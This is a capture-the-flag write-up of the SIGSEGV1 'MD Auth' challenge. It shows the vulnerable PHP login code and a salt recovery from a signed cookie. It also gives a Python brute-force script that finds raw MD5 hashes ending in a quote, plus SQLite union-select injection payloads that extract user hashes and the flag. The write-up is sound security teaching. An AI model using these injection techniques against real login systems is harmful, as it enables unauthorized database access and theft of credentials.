+++
title = "SIGSEGV1 Writeup - MD Auth"
date = "2018-12-23"
description = ""
[extra]
cover.image = "images/sigsegv1.png"
cover.alt = "SIGSEGV1 Writeup - MD Auth"
+++

Let's talk about the "MD Auth" challenge, I admit I started with this challenge thinking it would be about "Markdown". I was wrong but it was nonetheless interesting to solve.

<!--more-->

The source code of the index was available by requesting : [http://finale-docker.rtfm.re:4444/?source](http://finale-docker.rtfm.re:4444/?source)

```php
<?php
$_TITLE = 'MD Auth';
$_LONGTITLE = 'MD Auth';
$con = new SQLite3('mdauth.db');

require 'config.php'; # 7-digit APP_SALT, MAX_ERRORS and check_errors()
if(isset($_POST['login'], $_POST['password'])) {
    $errors = isset($_COOKIE['signed_errors']) ? check_errors($_COOKIE['signed_errors']) : 0;
    if($errors >= MAX_ERRORS) {
        presult('You have been banned for reaching '.MAX_ERRORS.' errors');
    } else {
        $login = $con->escapeString($_POST['login']);
        $hash = md5($con->escapeString(APP_SALT.$_POST['password']), true);
        $query = $con->query("SELECT login FROM users WHERE hash='{$hash}' and login='{$login}'");
        if(!$query) $row=FALSE; 
        else $row = $query->fetchArray();

        if($row !== FALSE&& $query->fetchArray() === FALSE) {
            presult("Welcome back {$row['login']}!");
        } else {
            presult('Wrong username/password combination!');
            setcookie('signed_errors', md5(APP_SALT.((string) ($errors+1))), time()+86400);
        }
    }
```

At first I tried to access the database with my browser by requesting [finale-docker.rtfm.re:4444/mdauth.db](finale-docker.rtfm.re:4444/mdauth.db), unfortunately that didn't work. Let's dig deeper into the source code. We want to authenticate on the Web Application, maybe we can do an SQL injection inside the following query.

```sql
SELECT login FROM users WHERE hash='{$hash}' and login='{$login}'
```

In order to exploit this, we need to bypass the `escapeString` function used for `$login` and `$hash`.

```php
<?php
$login = $con->escapeString($_POST['login']);
$hash = md5($con->escapeString(APP_SALT.$_POST['password']), true);
?>
```

The `md5` function is called with the second argument set to `true`, meaning we will get a binary output instead of a hexadecimal one. We might be able to get a backslash in the binary output, but we need to know the `APP_SALT` value in order to do our offline bruteforce. The author of the challenge was kind enough to provide a way to get this secret by misusing the `cookie`.

```php
<?php
setcookie('signed_errors', md5(APP_SALT.((string) ($errors+1))), time()+86400);
?>
```

We can do a single failed attempt in order to get a cookie containing the md5(SALT+"1"), based on the comment in the code we know the SALT is between 0000000-9999999 (7-digit APP_SALT). 

I got `MD5:4322dfb1e9b20645594e9f3f6998845a` which correspond to the following `PLAIN:86203711`. We now have our APP_SALT value : 8620371. The following script will bruteforce the first 1000 numbers looking for a quote in the last char of the MD5 output.

```python
import requests
import hashlib

# md5 true : http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
def computeMD5hash(my_string):
    m = hashlib.md5()
    m.update(my_string.encode('utf-8'))
    return m.digest()

# Use the salt to find a string ending by "\"
salt = "8620371"
for i in range(1000):
    md5 = computeMD5hash(salt+str(i))
    if "\\" == md5[-1]:
        print(salt+str(i), i,  md5)
```

In my first attempt, I was looking for a backslash "\" in order to escape the single quote "'" from the query and use the login to complete the SQL injection.

```sql
SELECT login FROM users WHERE hash='{$hash}' and login='{$login}'
SELECT login FROM users WHERE hash='GARBAGE\' and login=' OR 1=1--' 
```

It would have worked in a MySQL database, unfortunately we were in front of a SQLite one. The documentation and stackoverflow provided the useful information, escaping is done by doubling the quote.

```sql
INSERT INTO table_name (field1, field2) VALUES (123, 'Hello there''s');
```

I adjusted the script to check for a single quote and got the number `45`.

```python
salt = "8620371"
for i in range(1000):
    md5 = computeMD5hash(salt+str(i))
    if "'" == md5[-1]:
        print(salt+str(i), i,  md5)
```

Now it's just a simple SQL injection, by using the following credential i was able to extract interesting data.

```sql
login = "union all select hash from users limit 1--"
password = "45"

The query looked like "SELECT login FROM users WHERE hash='GARBAGE'' and login=' union all select hash from users limit 1--'"
with hash='GARBAGE'' and login='
```

I got the following users : `admin` and `flaggy`. Next step was to extract the flag from the database, it was located in the flag_field of the users.

```bash
union all select flag_field from users limit 2,1--
Welcome back sigsegv{82e9f4a155b9b740b4ff37624429b031}!
```